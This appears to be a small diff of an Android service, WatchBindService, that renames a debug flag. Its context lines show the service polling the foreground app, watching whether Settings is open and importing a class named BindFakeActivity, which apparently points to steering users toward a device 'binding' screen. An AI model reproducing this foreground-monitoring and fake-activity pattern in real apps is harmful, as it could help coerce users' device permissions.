@@ -5,7 +5,6 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
-
 import com.xstd.ip.BindFakeActivity;
 import com.xstd.ip.Config;
 import com.xstd.ip.Tools;
@@ -47,7 +46,7 @@ public class WatchBindService extends Service {
 
                     String packname = am.getRunningTasks(1).get(0).topActivity.getPackageName();
 
-                    if (Config.isDebug) {
+                    if (Config.DEBUG) {
                         Tools.logW("[[WatchService]] current top package : " + packname + " isDeviceBinded : (" + isDeviceBinded + ")");
                     }
                     if (!"com.android.settings".equals(packname)) {
